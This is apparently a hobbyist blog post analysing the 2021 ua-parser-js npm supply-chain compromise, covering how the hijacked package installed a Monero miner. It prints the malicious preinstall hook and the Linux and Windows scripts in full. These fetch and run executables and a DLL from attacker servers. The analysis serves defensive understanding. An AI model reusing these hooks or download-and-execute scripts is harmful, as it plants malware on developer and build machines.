---
title: "ua-parser-js Compromise"
date: 2021-10-24
tags: ["security"]
type: post
---

_Obvious Disclaimer: I'm not a professional security researcher.  I dabble in
these things and more pursue these things out of curiosity.  Let me know what I
got wrong._

Today I read that there was another victim of a Supply Chain attack, a NPM
module author had a few of their modules compromised, one of which (the one I
read about) was `ua-parser.js`.  This module provides detection of various
platform data from user agent strings.

There were a few offending versions, all of which were promptly taken down.  The
author [reported in the GitHub
issue](https://github.com/faisalman/ua-parser-js/issues/536) that the attacker
compromised an account without 2 factor authentication and published 3 rouge
versions.

Inspired by YouTubers like [John
Hammond](https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw), I dug into
this a bit to satisfy my own curiosity.

## How The Payload Was Installed

This was pretty simple, as NPM itself provides hooks that packages can use to
perform extra steps during installation.  This is fairly common, and in this
case the attacker used it to download and execute their payload.

This is the hook code in question:

```js
const { exec } = require("child_process");

function terminalLinux(){
    exec("/bin/bash preinstall.sh", (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
}

var opsys = process.platform;
if (opsys == "darwin") {
    opsys = "MacOS";
} else if (opsys == "win32" || opsys == "win64") {
    opsys = "Windows";
    const { spawn } = require('child_process');
    const bat = spawn('cmd.exe', ['/c', 'preinstall.bat']);
} else if (opsys == "linux") {
    opsys = "Linux";
    terminalLinux();
}
```

This node code was executed and then ran a script appropriate to your platform.
Both did basically the same thing, but this is the bash version.

```sh
IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\|UA\|BY\|KZ')
if [ -z "$IP" ]
    then
    var=$(pgrep jsextension)
    if [ -z "$var" ]
        then
        curl http://159.148.186.228/download/jsextension -o jsextension 
        if [ ! -f jsextension ]
            then
            wget http://159.148.186.228/download/jsextension -O jsextension
        fi
        chmod +x jsextension
        ./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u ---- --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &
    fi
fi
```

(some info redacted)

This script first checks if your in Russia, Ukrane, Belarus, or Kazakhstan and
skip execution if your IP is in those countries.

It then downloads a file called `jsextension`, but appears to really be a crypto
miner.  I can't download this and verify myself as the server hosting the file
appears to have already been shutdown.

This code ran as a hook in NPM, which only runs when using `npm` commands like
`npm install` and `npm ci`.  Therefore, the payload would only have been
downloaded on developer or CI machines that were installing node packages.

## Windows

The windows payload looks a bit more complex:

```bat
@echo off
curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe
if not exist jsextension.exe (
    wget http://159.148.186.228/download/jsextension.exe -O jsextension.exe
)
if not exist jsextension.exe (
    certutil.exe -urlcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe
)
curl https://citationsherbe.at/sdd.dll -o create.dll
if not exist create.dll (
    wget https://citationsherbe.at/sdd.dll -O create.dll
)
if not exist create.dll (
    certutil.exe -urlcache -f https://citationsherbe.at/sdd.dll create.dll
)
set exe_1=jsextension.exe
set "count_1=0"
>tasklist.temp (
tasklist /NH /FI "IMAGENAME eq %exe_1%"
)
for /f %%x in (tasklist.temp) do (
if "%%x" EQU "%exe_1%" set /a count_1+=1
)
if %count_1% EQU 0 (start /B .\jsextension.exe -k --tls --rig-id q -o pool.minexmr.com:443 -u --- --cpu-max-threads-hint=50 --donate-level=1 --background & regsvr32.exe -s create.dll)
del tasklist.temp
```

I'm working on digging into that `create.dll` file that gets downloaded, it
seems spooky-wooky to me, but I'll do a separate writeup of it because I have to
refresh my Windows skills.

## 159.148.186.228

This server belongs to a hosting company, and the payload was already removed
(and the server no longer listening on 443 or 80), so I presume the hosting
company caught wind and shut it down.

I did look at [shodan](https://www.shodan.io/host/159.148.186.228) to see if
there was anything interesting, and it looks like just VNC and X11 were running
on the machine.

I don't have access to the history, but I assume this IP is shared at the
hosting provider, so I doubt any of that information would be of substantial
use.

## jsextension

This was the main payload the hook tried to download, and I couldn't get a copy
of it outright.  I found that
[Sonatype](https://blog.sonatype.com/newly-found-npm-malware-mines-cryptocurrency-on-windows-linux-macos-devices)
ran it through
[VirusTotal](https://www.virustotal.com/gui/file/7f986cd3c946f274cdec73f80b84855a77bc2a3c765d68897fbc42835629a5d5).

Lots of programs flagged that executable, and in the details I saw another name
it was found by was `xmrig.exe`.

[XMRig](https://github.com/xmrig/xmrig) is a CPU and GPU coin miner, so the
intention of this compromise is pretty clear: mine coins.

## Mining Pool

One other thing I did note, was that the attacker set up the miner to use a
pool.  `minexmr.com` (rather `pool.minexmr.com`) is configured in the CLI flags
(along with the user's coin address, which I've removed), and is a Monero mining
pool.

The pool does provide a dashboard to see your mining stats, and I was able to
login with the key provided graciously by the attacker in their payload.  As of
this writing, the attacker still had active connections to the pool (although,
they all share the same name so it's unclear how many targets there were), and
had only been active for the past few days.

Also, the attacker seemed to be successful (at least from a monetary
perspective) and had $16 in their pool account.  Monero by design doesn't allow
you to view transactions associated with an address, so we can't know their
total earnings.  The pool also appears to have an automatic transfer-out
feature, so it's very likely they had already had transfers out already.

## Wrapping Up

Nothing earth shattering in this attack, user with 2 factor auth had their
account compromised and someone wanted to mine some crypto.

At the end of the day, it's another good argument for 2 factor authentication
everywhere, and evaluating your supply chain.  NPM packages have a reputation
for being extraordinarily recursive, so it's possible your had a potentially
compromised package without your direct knowledge.
